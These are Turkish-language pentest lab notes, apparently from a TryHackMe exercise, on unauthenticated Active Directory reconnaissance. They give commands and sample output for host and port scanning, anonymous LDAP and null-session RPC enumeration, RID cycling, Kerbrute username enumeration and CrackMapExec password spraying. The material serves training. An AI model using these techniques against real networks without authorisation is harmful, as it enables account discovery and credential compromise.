Saldırgan makinenizin hedef ağ ile iletişim kurabildiğini doğrulamak için komutu çalıştırabilirsiniz . Aşağıdaki terminal bir örnek çıktıyı göstermektedir.
```bash
route
```
çıktı:
```bash
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         10.10.0.1       0.0.0.0         UG    100    0        0 ens5
10.10.0.0       0.0.0.0         255.255.0.0     U     100    0        0 ens5
10.10.0.1       0.0.0.0         255.255.255.255 UH    100    0        0 ens5
[...]
10.211.11.0     10.250.11.1     255.255.255.0   UG    1000   0        0 tun0
10.250.11.0     0.0.0.0         255.255.255.0   U     0      0        0 tun0
[...]
```
---
Henüz hiçbir kimlik bilgimiz yok; yalnızca saldıran makinemiz en iyi ve en son araçlarla donatılmış.
Amacımız Active Directory ortamının yapısını keşfetmek, ana bilgisayarları ve hizmetleri belirlemek ve ağı haritalamak.
Bir saniyeliğine güzel bir ağ diyagramımız olmadığını ve kapsamımızın bir parçası olarak aşağıdaki alt ağın verildiğini hayal edelim: 10.211.11.0/24

Ana Bilgisayar Keşfi
Yapabileceğimiz ilk şeylerden biri alt ağ ana bilgisayar keşif taraması çalıştırmaktır. Bu, hedef ağ aralığımızdaki tüm canlı ana bilgisayarları tanımlamamızı sağlayacaktır. Çoğu istemci, pentest kapsamına bir alt ağ aralığı ekler, bu nedenle hedeflemek isteyebileceğimiz tüm etkin ana bilgisayarları keşfetmeliyiz. İlk ana bilgisayar keşfi için kullanılabilecek iki farklı aracı sergileyeceğiz.

fping

Tıpkı ping gibi , fping de bir ana bilgisayarın canlı olup olmadığını belirlemek için İnternet Kontrol İleti Protokolü (ICMP) isteklerini kullanır.
Ancak, fping ile bir alt ağ da dahil olmak üzere herhangi bir sayıda hedef belirleyebiliriz ve bu da onu ping komutundan daha çok yönlü hale getirir.
Bir hedefe yanıt verene veya zaman aşımına uğrayana kadar bir paket göndermek yerine, fping her istekten sonra bir sonraki hedefe geçecektir.

Hedef ağımızdaki canlı sunucuları keşfetmek için aşağıdaki komutu çalıştırabiliriz:
```bash
fping -agq 10.211.11.0/24
```
çıktı:
```bash
10.211.11.1
10.211.11.10
10.211.11.20
10.211.11.250
```
- a: Canlı sistemleri gösterir.
- g: Verilen IP ağ maskesinden bir hedef listesi oluşturur.
- q: sessiz mod, her bir araştırma sonucunu veya ICMP hata mesajlarını göstermez.


Yada
```bash
nmap -sn 10.211.11.0/24
```

Port Tarama
Canlı ana bilgisayarları keşfettiğimizde, hangi kritik AD ile ilgili hizmetlerin kullanıldığını ve istismar edilebileceğini belirlemek için hangisinin Etki Alanı Denetleyicisi ( DC ) olduğunu belirlemeliyiz.
Bunlar bazı yaygın Active Directory bağlantı noktaları ve protokolleridir:

| Port   | Protokol       | Anlamı Nedir                              |
|--------|----------------|-------------------------------------------|
| 88     | Kerberos       | Kerberos tabanlı numaralandırma potansiyeli |
| 135    | MS-RPC         | RPC sayımı potansiyeli (boş oturumlar)     |
| 139    | SMB / NetBIOS  | Eski SMB erişimi                           |
| 389    | LDAP           | AD’ye LDAP sorguları                       |
| 445    | SMB            | Modern SMB erişimi, sayım için kritik      |
| 464    | Kerberos (kpassvd) | Parola ile ilgili Kerberos hizmeti       |


DC'yi tanımlamaya yardımcı olmak için bu belirli portlarla bir servis sürümü taraması çalıştırabiliriz :
```bash
nmap -p 88,135,139,389,445 -sV -sC -iL hosts.txt
```
-sV: Bu sürüm algılamayı etkinleştirir. Nmap açık portlarda çalışan servislerin sürümünü belirlemeye çalışacaktır.
-sC: Varsayılan kategorideki Nmap Scripting Engine (NSE) betiklerini çalıştırır .
-iL: Bu, Nmap'e hedef ana bilgisayarların listesini dosyadan okumasını söyler hosts.txt. Bu dosyadaki her satır tek bir IP adresi veya ana bilgisayar adı içermelidir.

Etki Alanı Denetleyicisini, nmap komutumuzun çıktısında 88 ( Kerberos ), 389 (LDAP) ve 445 ( SMB ) portlarının açık olması ve 'Windows Server' gibi başlıkların veya hatta etki alanı adlarının gösterilmesinden tespit edebiliriz .

Daha kapsamlı bir değerlendirme yapıyorsak veya alışılmadık ortamlarla uğraşıyorsak, tam bir port taramasıyla başlamak, standart olmayan portlarda çalışan kritik hizmetleri kaçırmamamızı sağlar. Tüm açık portları taramak için bu komutu kullanabiliriz:

-sS: Tam bağlantı taramasından daha gizli olan TCP SYN taraması
-p-: 65.535 TCP portunun tamamını tarar .
-T3: Hız ve gizliliği dengelemek için zamanlama şablonunu "normal" olarak ayarlar.
-iL hosts.txt: Önceki nmap komutundan canlı bilgisayarların listesini girer .
-oN full_port_scan.txt: Sonuçları bir dosyaya çıktı olarak verir.
---


#Domain Enumeration:

Anonim LDAP bağlantısının etkin olup olmadığını şu şekilde test edebiliriz ldapsearch:
```bash
ldapsearch -x -H ldap://10.211.11.10 -s base
```
-x: Basit kimlik doğrulama, bizim durumumuzda anonim kimlik doğrulama.
-H: LDAP sunucusunu belirtir.
-s: Sorguyu yalnızca temel nesneyle sınırlar ve alt ağaçları veya alt nesneleri aramaz.
Etkinleştirildiğinde, aşağıdaki çıktıya benzer çok sayıda veri görmeliyiz:
çıktı:
```
dn:
domainFunctionality: 6
forestFunctionality: 6
domainControllerFunctionality: 7
rootDomainNamingContext: DC=tryhackme,DC=loc
ldapServiceName: tryhackme.loc:dc$@TRYHACKME.LOC
isGlobalCatalogReady: TR
dsServiceName: CN=NTDS Settings,CN=DC,CN=Servers,CN=Default-First-Site-Name,CN
 =Sites,CN=Configuration,DC=tryhackme,DC=loc
dnsHostName: DC.tryhackme.loc
defaultNamingContext: DC=tryhackme,DC=loc
currentTime: 20250514173531.0Z
configurationNamingContext: CN=Configuration,DC=tryhackme,DC=loc
search result
search: 2
result: 0 Success
```
```bash
ldapsearch -x -H ldap://10.211.11.10 -b "dc=tryhackme,dc=loc" "(objectClass=person)"
```

---
enum4linux 
[enum4linux](../enum4linux.md) bilgi topla kullanıcılar vb.

---
RPC Enumeration (Null Sessions):
Microsoft Uzaktan Prosedür Çağrısı (MSRPC), bir bilgisayarda çalışan bir programın, ağın altta yatan ayrıntılarını anlaması gerekmeden, başka bir bilgisayardaki bir programdan hizmet talep etmesini sağlayan bir protokoldür. RPC hizmetlerine SMB protokolü üzerinden erişilebilir. SMB, kimlik doğrulaması gerektirmeyen boş oturumlara izin verecek şekilde yapılandırıldığında, kimliği doğrulanmamış bir kullanıcı IPC $ paylaşımına bağlanabilir ve sistemden veya etki alanından kullanıcıları, grupları, paylaşımları ve diğer hassas bilgileri sıralayabilir.

Boş oturum erişimini doğrulamak için aşağıdaki komutu çalıştırabiliriz:
```bash
rpcclient -U "" 10.211.11.10 -N 
```
bu rpcclient içine girer ve enumdomusers çalıştırdığımızda kullanıcıların listesini verir
-U: Kullanıcı adını belirtmek için kullanılır, bizim durumumuzda anonim oturum açma için boş bir dize kullanıyoruz.
-N: RPC'ye bize parola sormamasını söyler.

Başarılı olursa kullanıcıları şu şekilde sıralayabiliriz:
enumdomusers
çıktı:
```bash
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[sshd] rid:[0x649]
user:[gerald.burgess] rid:[0x650]
user:[nigel.parsons] rid:[0x651]
user:[guy.smith] rid:[0x652]
user:[jeremy.booth] rid:[0x653]
user:[barbara.jones] rid:[0x654]
user:[marion.kay] rid:[0x655]
user:[kathryn.williams] rid:[0x656]
user:[danny.baker] rid:[0x657]
user:[gary.clarke] rid:[0x658]
```
--- 
RID Cycling:

```bash
 for i in $(seq 500 2000); do echo "queryuser $i" |rpcclient -U "" -N 10.211.11.10 2>/dev/null | grep -i "User Name"; done


	User Name   :	sshd
	User Name   :	gerald.burgess
	User Name   :	nigel.parsons
	User Name   :	guy.smith
	User Name   :	jeremy.booth
	User Name   :	barbara.jones 
```
---
Eğer bir user listimiz var ise yukarıdan elde ettiysek,
Kerbrute, Kerberos'a karşı kaba kuvvet kullanıcı adı numaralandırması gerçekleştirir :

```bash
kerbrute userenum --dc 10.211.11.10 -d tryhackme.loc users.txt
```
Çıktı:
```
2025/05/16 11:58:16 >  [+] VALID USERNAME:	 WRK$@tryhackme.loc
2025/05/16 11:58:16 >  [+] VALID USERNAME:	 guy.smith@tryhackme.loc
2025/05/16 11:58:16 >  [+] VALID USERNAME:	 sshd@tryhackme.loc
2025/05/16 11:58:16 >  [+] VALID USERNAME:	 nigel.parsons@tryhackme.loc
2025/05/16 11:58:16 >  [+] VALID USERNAME:	 gerald.burgess@tryhackme.loc
2025/05/16 11:58:16 >  [+] VALID USERNAME:	 barbara.jones@tryhackme.loc
2025/05/16 11:58:16 >  [+] VALID USERNAME:	 Administrator@tryhackme.loc
```
---
Password Spraying
Şifre püskürtme, küçük bir ortak şifre kümesinin birçok hesapta test edildiği bir saldırı tekniğidir. Kaba kuvvet saldırılarının aksine, şifre püskürtme, her hesabı yalnızca birkaç denemeyle test ederek hesap kilitlenmelerini önler ve birçok kuruluşta yaygın olan zayıf şifre uygulamalarından yararlanır. Şifre püskürtme genellikle etkilidir çünkü birçok kuruluş:

Sık sık parola değişikliği gerektirebilir ve kullanıcıların tahmin edilebilir kalıplar seçmesine yol açabilir (örneğin, Summer2025!).
Politikalarını iyi uygulamıyorlar.
Birden fazla hesapta ortak parolaları yeniden kullanın.
Spreyleme için yaygın şifre listeleri şunları içerir:

Mevsimsel şifreler.
BT ekipleri tarafından kullanılan varsayılan parolalar ( Password123).
Veri ihlalleri sonucu sızdırılan şifreler, örneğin rockyou.txt.
```bash
rpcclient -U "" 10.211.11.10 -N
```
daha sonra içeride 
```bash
rpcclient $> getdompwinfo
```
çıktı:
```
min_password_length: 12
password_properties: 0x00000001
DOMAIN_PASSWORD_COMPLEX
```
CrackMapExec
```bash
 crackmapexec smb 10.211.11.10 --pass-pol
```

```bash
 crackmapexec smb 10.211.11.20 -u users.txt -p passwords.txt
```
çıktı
```
[*] First time use detected
[*] Creating home directory structure
[*] Creating missing folder logs
[*] Creating missing folder modules
[*] Creating missing folder protocols
[*] Creating missing folder workspaces
[*] Creating missing folder obfuscated_scripts
[*] Creating missing folder screenshots
[*] Copying default configuration file
SMB         10.211.11.20    445    WRK              [*] Windows 10.0 Build 17763 x64 (name:WRK) (domain:tryhackme.loc) (signing:False) (SMBv1:False)
SMB         10.211.11.20    445    WRK              [-] tryhackme.loc\Administrator:Password! STATUS_LOGON_FAILURE
SMB         10.211.11.20    445    WRK              [-] tryhackme.loc\Guest:Password! STATUS_LOGON_FAILURE
SMB         10.211.11.20    445    WRK              [-] tryhackme.loc\krbtgt:Password! STATUS_LOGON_FAILURE
SMB         10.211.11.20    445    WRK              [-] tryhackme.loc\DC$:Password! STATUS_LOGON_FAILURE
SMB         10.211.11.20    445    WRK              [-] tryhackme.loc\WRK$:Password! STATUS_LOGON_FAILURE
SMB         10.211.11.20    445    WRK              [-]
SMB         10.211.11.20    445    WRK              [-] tryhackme.loc\asrepuser1:Password1! STATUS_LOGON_FAILURE
SMB         10.211.11.20    445    WRK              [+] tryhackme.loc\*****:******
```

